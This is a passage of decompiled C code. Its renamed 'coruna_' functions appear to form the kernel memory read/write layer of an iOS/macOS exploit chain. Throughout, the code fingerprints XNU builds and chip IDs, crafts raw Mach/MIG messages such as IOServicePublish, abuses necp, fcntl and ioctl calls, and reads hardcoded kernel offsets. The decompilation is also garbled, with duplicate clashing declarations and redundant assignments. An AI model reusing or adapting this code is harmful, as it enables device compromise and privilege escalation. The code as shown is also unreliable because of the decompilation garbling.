      ptr = _calloc((unsigned long)size,1);
    }
    else {
      size = size + 0x400;
      ptr = _realloc((void *)*handle,(unsigned long)((int)handle[1] + size));
    }
    if (ptr != (void *)0x0) {
      *handle = (long)ptr;
      *(uint *)((long)handle + 0xc) = (int)handle[1] + size;
      if ((int)handle[1] == 0) {
        *(uint32_t *)(handle + 1) = 0x1c;
      }
    }
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_249_2(long *handle,uint64_t val,uint32_t size)
{
  uint64_t *ptr;
  int err;
  
  err = coruna_kernel5_residual_249((int)handle,0x10);
  if (err == 0) {
    ptr = (uint64_t *)((unsigned long)*(uint *)(handle + 1) + *handle);
    *ptr = val;
    *(uint32_t *)(ptr + 1) = 0x2130000;
    *(uint32_t *)((long)ptr + 0xc) = size;
    *(int *)(handle + 1) = (int)handle[1] + 0x10;
    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}
void coruna_memcpy_1a2bc(long *handle,void *ctx,unsigned long arg)
{
  int err;
  
  err = coruna_kernel5_residual_249(handle,arg);
  if (err == 0) {
    _memcpy((void *)((unsigned long)*(uint *)(handle + 1) + *handle),ctx,arg & 0xffffffff);
    *(int *)(handle + 1) = (int)handle[1] + (int)arg;
  }
  return;
}
void coruna_mach_msg(uint64_t *val,uint32_t size,uint32_t flags_2,uint32_t version_3)
{
  uint32_t u;
  int err;
  mach_msg_size_t send_size;
  uint32_t *ptr;
  
  if ((val != (uint64_t *)0x0) &&
     (ptr = (uint32_t *)*val, ptr != (uint32_t *)0x0)) {
    err = *(int *)(val + 2);
    u = 0x1514;
    if (err != 0) {
      u = 0x80001514;
    }
    *ptr = u;
    send_size = *(mach_msg_size_t *)(val + 1);
    ptr[1] = send_size;
    ptr[2] = flags_2;
    ptr[3] = size;
    ptr[4] = 0;
    ptr[5] = version_3;
    ptr[6] = err;
    _mach_msg((mach_msg_header_t *)*val,0x40001,send_size,0,0,0,0);
  }
  return;
}
void coruna_uname(uint64_t *val)
{
  uint64_t u;
  int err;
  char *ptr;
  char *buf;
  uint64_t size;
  uint32_t version;
  long handle;
  unsigned long port;
  int scratch [4];
  utsname scratch;
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  _uname(&scratch);
  buf = scratch.version;
  ptr = _strdup(buf);
  *val = ptr;
  scratch[0] = 0;
  scratch[1] = 0;
  scratch[2] = 0;
  scratch[3] = 0;
  ptr = _strstr(buf,"xnu-");
  err = _sscanf(ptr,"xnu-%d.%d.%d~%d");
  if (err != 4) {
    ptr = _strstr(buf,"xnu-");
    err = _sscanf(ptr,"xnu-%d.%d.%d.%d.%d~%d");
    if (err != 6) {
      size = 1;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(size);
    }
  }
  handle = 0;
  port = 0;
  do {
    port = (long)*(int *)((long)scratch + handle) + port * 1000;
    handle = handle + 4;
  } while (handle != 0x10);
  val[1] = port;
  version = 0x26;
  *(uint32_t *)((long)val + 0x24) = 0x26;
  buf = _strstr(buf,"T8120");
  if (buf != (char *)0x0) {
    version = 0x2e;
  }
  *(uint32_t *)((long)val + 0x24) = version;
  if (port < 8020000000000) {
    if (port < 0x73835ab9470) {
      version = 0x68;
    }
    else {
      version = 0x58;
    }
  }
  else {
    version = 0x48;
  }
  *(uint32_t *)(val + 4) = version;
  u = k_kernel_rodata_word_43760;
  size = 0;
  val[3] = k_kernel_rodata_word_00043768;
  val[2] = u;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(size);
}
void coruna_ioservicegetmatchingservice_1a3ec(void)
{
  long handle;
  
  handle = _IOServiceMatching();
  if (handle != 0) {
    _IOServiceGetMatchingService(*(uint32_t *)k_kernel_kiomasterportdefault_slot,handle);
  }
  return;
}
void coruna_mig_dealloc_reply_port(mach_port_t port,uint64_t val,uint64_t id_2,uint32_t size,
                 uint32_t flags_2,void *ctx,int flags)
{
  unsigned long u;
  uint size;
  byte err;
  mach_port_t rcv_name;
  int err;
  mach_msg_return_t lm5;
  int status;
  mach_msg_header_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint32_t serial_buf;
  uint64_t scratch;
  uint64_t action;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t block_ctx;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_saved;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t path_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t tmp_buf;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  long region;
  
  region = *(long *)k_kernel_stack_chk_guard_slot;
  cache_20 = 0;
  tmp_buf = 0;
  cache_22 = 0;
  cache_21 = 0;
  frame = 0;
  path_buf = 0;
  cache = 0;
  work = 0;
  plist = 0;
  sa_new = 0;
  json_buf = 0;
  url_buf = 0;
  path_buf = 0;
  sa_saved = 0;
  region = 0;
  tmp_buf = 0;
  stack_guard = 0;
  stack_guard = 0;
  sa_new = 0;
  sa_saved = 0;
  serial_buf = 0;
  block_ctx = 0;
  block_ctx = 0;
  action = 0;
  bootargs = 0;
  action = 0;
  host_info = 0;
  thread_attr = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch.msgh_reserved = 0;
  scratch.msgh_id = 0;
  scratch = 0;
  host_info = 0;
  serial_buf = 0;
  scratch.msgh_remote_port = 0;
  scratch.msgh_local_port = 0;
  scratch.msgh_bits = 0;
  scratch.msgh_size = 0;
  rcv_name = _mig_get_reply_port();
  if (rcv_name == 0) {
    status = 0;
    err = 0;
    err = 1;
  }
  else {
    scratch.msgh_bits = 0x80001513;
    scratch.msgh_local_port = rcv_name;
    scratch.msgh_remote_port = port;
    scratch.msgh_id = (mach_msg_id_t)k_kernel_rodata_word_43770;
    bootargs = (int)((unsigned long)k_kernel_rodata_word_43770 >> 0x20);
    thread_attr = (int)id_2;
    host_info = (int)((unsigned long)id_2 >> 0x20);
    serial_buf = 0x1000000;
    scratch = coruna_u64_pack((flags_2), (size));
    action = coruna_u64_pack((0x140000), ((uint32_t))action);
    bootargs = *(uint64_t *)k_kernel_ndr_record_slot;
    err = ___strlcpy_chk(&host_info,val,0x80,0x80);
    size = err + 1;
    err = 0;
    if ((size & 7) != 0) {
      err = 8 - (size & 7);
    }
    size = err + size;
    thread_attr = coruna_u64_pack((size), ((uint32_t))thread_attr);
    u = (unsigned long)size;
    *(uint32_t *)((long)&host_info + u) = size;
    *(int *)((long)&host_info + u + 4) = flags;
    _memcpy((void *)((long)&block_ctx + u),ctx,(unsigned long)(uint)(flags << 3));
    lm5 = _mach_msg(&scratch,3,size + flags * 8 + 0x50,0x110,rcv_name,0,0);
    if (lm5 == 0) {
      if (scratch.msgh_id == 0xb9a) {
        if (((int)scratch.msgh_bits < 0) && (bootargs == 1)) {
          err = 1;
          err = thread_attr;
          status = 0;
        }
        else {
          err = 0;
          err = 1;
          status = host_info;
        }
      }
      else {
        err = 0;
        err = 1;
        status = -0x12d;
      }
    }
    else {
      _mig_dealloc_reply_port(rcv_name);
      err = 0;
      err = 0;
      status = 0;
    }
  }
  if (!(bool)(err & status == 0 & err != 0 & err != -1)) {
    err = 0;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != region) {
    ___stack_chk_fail(err);
  }
  return;
}
void coruna_ioservice_publish_25d44(uint64_t val,uint64_t id_2,mach_port_name_t *arg)
{
  uint8_t *ptr;
  mach_port_t host;
  kern_return_t lk2;
  int err;
  mach_port_name_t scratch;
  io_master_t bootargs;
  
  host = _mach_host_self();
  lk2 = _host_get_io_master(host,&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if ((lk2 == 0) &&
     (lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch),
     lk2 == 0)) {
    err = coruna_mig_dealloc_reply_port(bootargs,"IOServicePublish",val,id_2,scratch,0,0);
    if (err == 0) {
      _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
    }
    else {
      *arg = scratch;
    }
  }
  return;
}
void coruna_thread_policy_set(thread_act_t arg,thread_policy_t arg_x)
{
  kern_return_t lk1;
  
  lk1 = _thread_policy_set(arg,2,arg_x,4);
  if (lk1 == 0) {
    _thread_policy_set(arg,3,arg_x + 4,1);
  }
  return;
}
void coruna_mach_timebase_info(uint64_t val,uint size)
{
  kern_return_t lk1;
  double ld2;
  double ld3;
  mach_timebase_info_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint64_t serial_buf;
  
  lk1 = _mach_timebase_info(&scratch);
  if (lk1 == 0) {
    ld2 = (double)NEON_ucvtf((unsigned long)scratch.denom);
    ld3 = (double)NEON_ucvtf((unsigned long)scratch.numer);
    ld2 = (ld2 / ld3) * k_kernel_rodata_word_42ef0;
    bootargs = (int)(ld2 * (double)size);
    thread_attr = (int)(ld2 * 50.0);
    serial_buf = k_kernel_rodata_word_43778;
    host_info = bootargs;
    coruna_thread_policy_set(val,&bootargs);
  }
  return;
}
void coruna_call_mach_timebase_info(uint64_t val)
{
  coruna_mach_timebase_info(val,0x32);
  return;
}
void coruna_kernel5_residual_251(long handle,uint size)
{
  if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
    if (0x3f < size) {
      return;
    }
    *(uint32_t *)(*(long *)(handle + 0x118) + (unsigned long)size) = 0;
  }
  return;
}
void coruna_mach_absolute_time_1a9c0(long handle,uint size,uint flags_2)
{
  byte *ptr;
  byte err;
  char err;
  bool status;
  unsigned long u;
  uint64_t size;
  uint64_t version;
  long handle;
  
  handle = *(long *)(handle + 0x118);
  if (((handle != 0) && (*(long *)(handle + 0x120) != 0)) && (size < 0x40)) {
    size = _mach_absolute_time();
    ptr = (byte *)(handle + (unsigned long)size);
    do {
      err = *ptr;
      err = '\x01';
      status = (bool)coruna_ldrex_pass(ptr,0x10);
      if (status) {
        *ptr = 1;
        err = coruna_ldrexp_clear();
      }
    } while (err != '\0');
    while ((err & 1) != 0) {
      if (flags_2 != 0) {
        version = _mach_absolute_time();
        u = 0;
        if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
          u = ((version - size) * (unsigned long)*(uint *)(handle + 0x25c)) /
                  (unsigned long)*(uint *)(handle + 0x260);
        }
        if ((unsigned long)flags_2 < u / 1000000) {
          return;
        }
      }
      _thread_switch(0,2,1);
      do {
        err = *ptr;
        err = '\x01';
        status = (bool)coruna_ldrex_pass(ptr,0x10);
        if (status) {
          *ptr = 1;
          err = coruna_ldrexp_clear();
        }
      } while (err != '\0');
    }
  }
  return;
}
void coruna_close(int flags)
{
  int err;
  
  err = _close(flags);
  if (err != 0) {
    ___error();
    ___error();
  }
  return;
}
void coruna_open_dev_null(int *flags)
{
  int err;
  
  err = _open("/dev/null",0x20);
  if (err < 0) {
    ___error();
    ___error();
  }
  else {
    *flags = err;
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_238(long handle,long addr_2,uint64_t val,uint32_t size,int flags)
{
  uint8_t *ptr;
  int err;
  long handle;
  long scratch;
  long bootargs;
  long thread_attr;
  uint32_t host_info;
  uint32_t scratch;
  uint32_t serial_buf;
  uint32_t bootargs;
  long action;
  uint32_t block_ctx;
  
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1938 + handle) != -1)) &&
     ((*(int *)(&k_kernel_slot_193c + handle) != -1 && (handle = coruna_kernel5_residual_225(handle), handle != 0)))) {
    ptr = &k_kernel_slot_1930 + handle;
    block_ctx = 0xffffffff;
    if ((flags == 0) ||
       ((err = coruna_open_dev_null(&block_ctx), err == 0 && (err = coruna_kernel5_residual_236(ptr), err == 0)))
       ) {
      scratch = 0;
      serial_buf = 0;
      bootargs = 0x10000000;
      host_info = size;
      action = addr_2;
      err = coruna_kernel5_residual_237(ptr,&host_info,0x18);
      if ((err == 0) &&
         ((err = coruna_kernel5_residual_238(ptr,&scratch,0x18), err == 0 &&
          ((coruna_u64_pack((scratch), (host_info)) == scratch && coruna_u64_pack((bootargs), (serial_buf)) == bootargs)
           && action == thread_attr)))) {
        coruna_kernel5_residual_238(&k_kernel_slot_1938 + handle,val,size);
      }
      if (flags == 0) {
        return;
      }
    }
    coruna_close(block_ctx);
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_237(long handle,long addr_2,uint64_t val,uint32_t size,int flags)
{
  uint8_t *ptr;
  int err;
  long handle;
  long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint32_t block_ctx;
  
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1938 + handle) != -1)) &&
     ((*(int *)(&k_kernel_slot_193c + handle) != -1 && (handle = coruna_kernel5_residual_225(handle), handle != 0)))) {
    ptr = &k_kernel_slot_1930 + handle;
    block_ctx = 0xffffffff;
    if ((flags == 0) ||
       ((err = coruna_open_dev_null(&block_ctx), err == 0 && (err = coruna_kernel5_residual_236(ptr), err == 0)))
       ) {
      serial_buf = k_kernel_rodata_word_00043798;
      host_info = k_kernel_rodata_word_43790;
      action = addr_2;
      err = coruna_kernel5_residual_237(ptr,&host_info,0x18);
      if ((err == 0) &&
         ((err = coruna_kernel5_residual_238(ptr,&scratch,0x18), err == 0 &&
          ((host_info == scratch && serial_buf == bootargs) && action == thread_attr)))) {
        coruna_kernel5_residual_237(&k_kernel_slot_1938 + handle,val,size);
      }
      if (flags == 0) {
        return;
      }
    }
    coruna_close(block_ctx);
  }
  return;
}
void coruna_kernel509_residual_306(long handle,uint64_t *val,long addr_2,uint64_t id_2,int flags)
{
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  val[2] = k_kernel_rodata_word_43780;
  *(uint32_t *)((long)val + 0x1c) = 0;
  if ((flags == 7) && (*(long *)(handle + 0x220) != 0)) {
    val[5] = *(long *)(handle + 0x220);
    val[7] = addr_2 + 0x60;
    val[0xd] = id_2;
  }
  else {
    val[5] = addr_2 + 0x60;
    val[7] = id_2;
    *(int *)(val + 0xc) = flags;
  }
  val[8] = 0;
  *(uint8_t *)((long)val + 0x53) = 0x22;
  val[0xb] = 0;
  return;
}
void coruna_kernel509_via_kernel5_residual_237_2(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint u;
  int err;
  unsigned long size;
  uint8_t scratch[96];
  uint8_t bootargs[96];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  err = coruna_kernel509_via_mach_vm_read_overwrite_3(val,size_3,0x60,bootargs,1);
  if (err == 0) {
    size = 0x2800f;
  }
  else {
    size = coruna_kernel5_residual_237(id_2,bootargs,0x60);
    if (((int)size == 0) && (size = coruna_kernel5_residual_238(id_2,scratch,0x60), (int)size == 0)) {
      err = _memcmp(bootargs,scratch,0x60);
      u = 0;
      if (err != 0) {
        u = 0xad014;
      }
      size = (unsigned long)u;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
    ___stack_chk_fail(size);
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_2667c(void)
{
  coruna_kernel509_via_mach_vm_read_overwrite_3();
  return;
}
void coruna_uuid_is_null(long handle)
{
  uint32_t u;
  int err;
  
  if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      if (*(long *)(handle + 0x230) == 0) {
        return;
      }
      if (*(long *)(handle + 0x228) == 0) {
        return;
      }
      if (*(char *)(handle + 0xb) == '\0') {
        return;
      }
      u = 0x800100;
    }
    else {
      if (*(int *)(&k_kernel_slot_1944 + handle) == -1) {
        return;
      }
      err = _uuid_is_null(&k_kernel_slot_1948 + handle);
      if (err != 0) {
        return;
      }
      if (*(long *)(&k_kernel_slot_1958 + handle) == 0) {
        return;
      }
      if (*(char *)(handle + 0xb) == '\0') {
        return;
      }
      u = 0x8000100;
    }
    coruna_fn_ptr_cast_10(handle,u);
  }
  return;
}
void coruna_pthread_attr_setdetachstate_267a8(long handle)
{
  uint32_t u;
  uint size;
  int err;
  int status;
  mach_port_t lm5;
  kern_return_t lk6;
  vm_address_t *ptr;
  uint64_t version;
  void **lppv9;
  long handle;
  unsigned long port;
  long addr;
  vm_size_t size;
  uint64_t scratch;
  int bootargs;
  long thread_attr;
  vm_address_t host_info;
  pthread_t serial_buf;
  pthread_attr_t action;
  long block_ctx;
  
  block_ctx = *(long *)k_kernel_stack_chk_guard_slot;
  if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      u = *(uint32_t *)k_kernel_mach_task_self_slot;
      handle = coruna_call_macho_data_seg_25b54_35f28(handle,u,&action);
      if (handle != 0) {
        *(long *)(handle + 0x230) = handle;
        handle = coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4_2(handle,u);
        if (handle != 0) {
          *(long *)(handle + 0x228) = handle;
        }
      }
    }
    else {
      serial_buf = (pthread_t)0x0;
      version = _necp_open(0);
      err = (int)version;
      if (err == -1) {
        ___error();
        ___error();
      }
      else {
        status = _necp_client_action(version,1,&action,0x10,&serial_buf,8);
        if (status == -1) {
          ___error();
          ___error();
        }
        else {
          status = coruna_kernel509_via_fn_ptr_cast_2_14(handle,version,&host_info);
          if (((status == 0) && (status = coruna_kernel509_residual_307(handle,host_info + 0x18,&thread_attr), status != 0)
              ) && (handle = coruna_fn_ptr_cast_2(handle,thread_attr), handle != 0)) {
            port = *(unsigned long *)(handle + 0x158);
            handle = 0x570;
            if (port < 0x1f541e00000000) {
              handle = 0x370;
            }
            addr = 0x580;
            if (port >> 0x2b < 1099) {
              addr = handle;
            }
            status = coruna_kernel509_via_mach_vm_read_overwrite_3(handle,addr + thread_attr,4,&bootargs,1);
            if (status != 0) {
              if (bootargs == 8) {
                handle = 0x578;
                if (port < 0x1f541e00000000) {
                  handle = 0x378;
                }
                addr = 0x588;
                if (port >> 0x2b < 1099) {
                  addr = handle;
                }
                status = coruna_kernel509_residual_307(handle,thread_attr + addr,&scratch);
                if ((status != 0) && (handle = coruna_fn_ptr_cast_2(handle,scratch), handle != 0)) {
                  *(int *)(&k_kernel_slot_1944 + handle) = err;
                  *(uint64_t *)(&UNK_00001950 + handle) = action.__opaque;
                  *(long *)(&k_kernel_slot_1948 + handle) = action.__sig;
                  *(long *)(&k_kernel_slot_1958 + handle) = thread_attr;
                }
              }
              if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
              ___stack_chk_fail();
              }
              return;
            }
          }
        }
        _close(err);
      }
    }
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail();
    }
    return;
  }
  host_info = 0;
  serial_buf = (pthread_t)0x0;
  ptr = _calloc(1,0x20);
  if (ptr == (vm_address_t *)0x0) {
    size = 0;
  }
  else {
    err = _pthread_attr_init(&action);
    if (err == 0) {
      err = _pthread_attr_setdetachstate(&action,1);
      if (err == 0) {
        lppv9 = (void **)coruna_kernel509_via_helper_5d2c_419fc(coruna_helper_1249c_2c0fc);
        err = _pthread_create_suspended_np(&serial_buf,&action,lppv9,(void *)0x0);
        _pthread_attr_destroy(&action);
        if (err == 0) {
          lm5 = _pthread_mach_thread_np(serial_buf);
          handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,lm5);
          if (handle == 0) {
            size = 0;
          }
          else {
            err = coruna_fn_ptr_cast_10(handle,0x4000000);
            if (err == 0) {
              err = coruna_fn_ptr_cast_10(handle,0x5584001);
              if (err == 0) {
                err = coruna_fn_ptr_cast_10(handle,0x200);
                addr = 0x100;
                if (err != 0) {
                  addr = 0xb8;
                }
              }
              else {
                addr = 0xb8;
              }
            }
            else {
              addr = 0x108;
            }
            port = coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6(handle,addr + handle);
            if (port == 0) {
              size = 0;
            }
            else {
              host_info = 0;
              size = (vm_size_t)*(uint *)(handle + 0x180);
              err = coruna_vm_map_28574(handle,&host_info,size,
                                   port & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff));
              if (err == 0) {
                ptr[1] = size;
                ptr[2] = (vm_address_t)serial_buf;
                size = *(uint *)(handle + 0x188);
                *(mach_port_t *)(ptr + 3) = lm5;
                *(uint *)((long)ptr + 0x1c) = size & (uint)port;
                *ptr = host_info;
                *(vm_address_t **)(&k_kernel_slot_1d50 + handle) = ptr;
                if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
                ___stack_chk_fail();
                }
                return;
              }
            }
          }
          if (serial_buf != (pthread_t)0x0) {
          lm5 = _pthread_mach_thread_np(serial_buf);
          lk6 = _thread_resume(lm5);
          if (lk6 == 0) {
          _pthread_join(serial_buf,(void **)0x0);
          }
          }
          if ((host_info != 0) && (size != 0)) {
          _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,host_info,size);
          }
          if (ptr != (vm_address_t *)0x0) {
          _free(ptr);
          }
          if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
          ___stack_chk_fail();
          }
          return;
        }
      }
      else {
        _pthread_attr_destroy(&action);
      }
    }
    size = 0;
  }
done:
  if (serial_buf != (pthread_t)0x0) {
    lm5 = _pthread_mach_thread_np(serial_buf);
    lk6 = _thread_resume(lm5);
    if (lk6 == 0) {
      _pthread_join(serial_buf,(void **)0x0);
    }
  }
  if ((host_info != 0) && (size != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,host_info,size);
  }
  if (ptr != (vm_address_t *)0x0) {
    _free(ptr);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_pthread_mach_thread_np(long handle)
{
  uint32_t u;
  int err;
  kern_return_t lk3;
  mach_port_t target_act;
  vm_address_t *ptr;
  uint32_t scratch;
  uint32_t bootargs;
  
  if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      return;
    }
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err != 0) {
      return;
    }
    if (*(int *)(&k_kernel_slot_1944 + handle) != -1) {
      _close(*(int *)(&k_kernel_slot_1944 + handle));
      *(uint32_t *)(&k_kernel_slot_1944 + handle) = 0xffffffff;
    }
    *(uint64_t *)(&UNK_00001950 + handle) = 0;
    *(uint64_t *)(&k_kernel_slot_1948 + handle) = 0;
    *(uint64_t *)(&k_kernel_slot_1958 + handle) = 0;
    u = scratch;
  }
  else {
    bootargs = 0xffffffff;
    err = coruna_open_dev_null(&bootargs);
    if (err != 0) {
      return;
    }
    ptr = *(vm_address_t **)(&k_kernel_slot_1d50 + handle);
    *(uint64_t *)(&k_kernel_slot_1d50 + handle) = 0;
    u = bootargs;
    if (ptr != (vm_address_t *)0x0) {
      if ((((*ptr == 0) || (ptr[1] == 0)) ||
          (lk3 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*ptr,ptr[1]),
          lk3 == 0)) && ((pthread_t)ptr[2] != (pthread_t)0x0)) {
        target_act = _pthread_mach_thread_np((pthread_t)ptr[2]);
        lk3 = _thread_resume(target_act);
        if (lk3 == 0) {
          _pthread_join((pthread_t)ptr[2],(void **)0x0);
        }
      }
      ptr[1] = 0;
      *ptr = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      *(uint64_t *)(&k_kernel_slot_1d50 + handle) = 0;
      _free(ptr);
      u = bootargs;
    }
  }
  coruna_close(u);
  return;
}
void coruna_fn_ptr_cast_5(void)
{
  return;
}
void coruna_kernel5_residual_254(long handle)
{
  if (((((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       (*(int *)(&k_kernel_slot_1940 + handle) == -1)) || (*(long *)(handle + 0x218) == 0)) &&
     (((*(int *)(handle + 0xe8) + 1U < 2 || (*(long *)(handle + 0xf8) == 0)) ||
      ((*(long *)(handle + 0x100) == 0 || (0x2711 < *(int *)(handle + 0x140))))))) {
    return;
  }
  return;
}
void coruna_fcntl_26e9c(long handle,long addr_2,long off_3,uint size,int flags)
{
  unsigned long u;
  int *err;
  uint size;
  int err;
  uint version;
  long handle;
  int *status;
  uint *ptr;
  uint port;
  unsigned long tag;
  unsigned long kind;
  uint type_id;
  size_t ls13;
  uint32_t scratch;
  uint8_t bootargs[160];
  int thread_attr [42];
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1940 + handle) != -1)) &&
     ((*(long *)(handle + 0x218) != 0 && (handle = coruna_kernel5_residual_225(handle), handle != 0)))) {
    err = (int *)(&k_kernel_slot_1930 + handle);
    scratch = 0xffffffff;
    if ((flags == 0) ||
       ((err = coruna_open_dev_null(&scratch), err == 0 && (err = coruna_kernel5_residual_236(err), err == 0))
       )) {
      port = 4;
      if (*(long *)(handle + 0x220) != 0) {
        port = 8;
      }
      if (size != 0) {
        tag = 0;
        do {
          u = addr_2 + tag;
          type_id = size - (int)tag;
          ls13 = (size_t)type_id;
          if ((((*(unsigned long *)(handle + 0x188) & u) != 0) || (type_id < 0x4000)) ||
             (err = coruna_uuid_is_null(handle), err == 0)) {
            if (port < type_id || port - type_id == 0) {
              kind = 0;
            }
            else {
              version = 0;
              if ((((u - 1) + ls13 ^ (u - 1) + (unsigned long)port) &
                  (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) != 0) {
                version = port - type_id;
              }
              kind = (unsigned long)version;
            }
            if (*(long *)(handle + 0x220) == 0) {
              err = coruna_kernel509_via_kernel5_residual_237_3(handle,u - kind);
              if (err == 0) {
                status = ___error();
                *status = 0;
                err = _fcntl(*(int *)(&k_kernel_slot_1940 + handle),5);
                thread_attr[0] = err;
                if ((err == -1) && (status = ___error(), *status != 0)) {
                  status = ___error();
                  err = *status;
                  ptr = (uint *)___error();
                  version = -*ptr;
                  if (-1 < err) {
                    version = *ptr;
                  }
                  version = version | 0x40000000;
                  type_id = port;
                }
                else {
                  if (3 < type_id) {
                    ls13 = 4;
                  }
                  _memcpy((void *)(off_3 + tag),(void *)((long)thread_attr + kind),ls13);
                  version = 0;
                  type_id = port;
                }
                coruna_kernel509_via_kernel5_residual_237_4(handle);
                if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
                ___stack_chk_fail();
                }
                return;
              }
            }
            else if (((*err != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
                    (*(long *)(handle + 0x218) != 0)) {
              thread_attr[0x22] = 0;
              thread_attr[0x23] = 0;
              thread_attr[0x20] = 0;
              thread_attr[0x21] = 0;
              thread_attr[0x26] = 0;
              thread_attr[0x27] = 0;
              thread_attr[0x24] = 0;
              thread_attr[0x25] = 0;
              thread_attr[0x1a] = 0;
              thread_attr[0x1b] = 0;
              thread_attr[0x18] = 0;
              thread_attr[0x19] = 0;
              thread_attr[0x1e] = 0;
              thread_attr[0x1f] = 0;
              thread_attr[0x1c] = 0;
              thread_attr[0x1d] = 0;
              thread_attr[0x12] = 0;
              thread_attr[0x13] = 0;
              thread_attr[0x10] = 0;
              thread_attr[0x11] = 0;
              thread_attr[0x16] = 0;
              thread_attr[0x17] = 0;
              thread_attr[0x14] = 0;
              thread_attr[0x15] = 0;
              thread_attr[10] = 0;
              thread_attr[0xb] = 0;
              thread_attr[8] = 0;
              thread_attr[9] = 0;
              thread_attr[0xe] = 0;
              thread_attr[0xf] = 0;
              thread_attr[0xc] = 0;
              thread_attr[0xd] = 0;
              thread_attr[2] = 0;
              thread_attr[3] = 0;
              thread_attr[0] = 0;
              thread_attr[1] = 0;
              thread_attr[6] = 0;
              thread_attr[7] = 0;
              thread_attr[4] = 0;
              thread_attr[5] = 0;
              coruna_kernel509_residual_306(handle,thread_attr,*(long *)(handle + 0x218),(u - kind) + -0x48,7);
              err = coruna_kernel5_residual_237(err,thread_attr,0xa0);
              if (((err == 0) && (err = coruna_kernel5_residual_238(err,bootargs,0xa0), err == 0)) &&
                 (err = _memcmp(thread_attr,bootargs,0xa0), err == 0)) {
                err = _ioctl(*(int *)(&k_kernel_slot_1940 + handle),0x40087367);
                if (err == 0) {
                  if (7 < type_id) {
                    ls13 = 8;
                  }
                  _memcpy((void *)(off_3 + tag),(void *)((long)thread_attr + kind),ls13);
                  version = 0;
                  type_id = port;
                }
                else {
                  status = ___error();
                  err = *status;
                  ptr = (uint *)___error();
                  version = -*ptr;
                  if (-1 < err) {
                    version = *ptr;
                  }
                  version = version | 0x40000000;
                  type_id = port;
                }
                coruna_kernel509_via_kernel5_residual_237_4(handle);
                if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
                ___stack_chk_fail();
                }
                return;
              }
            }
done:
